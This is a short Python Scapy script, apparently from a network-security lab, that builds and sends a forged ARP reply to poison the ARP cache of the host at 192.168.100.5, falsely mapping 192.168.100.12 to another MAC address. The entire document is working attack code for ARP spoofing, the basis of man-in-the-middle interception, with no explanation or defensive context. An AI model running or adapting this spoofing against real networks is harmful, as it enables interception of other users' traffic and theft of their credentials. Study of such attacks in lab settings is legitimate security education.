#!/usr/bin/env python3
from scapy.all import *
E = Ether(dst='08:00:27:21:6f:67', src='08:00:27:0c:d0:d5')
A = ARP(hwsrc='08:00:27:0c:d0:d5', psrc='192.168.100.12', hwdst='08:00:27:21:6f:67', pdst='192.168.100.5')
A.op = 2
pkt = E/A
pkt.show()
sendp(pkt)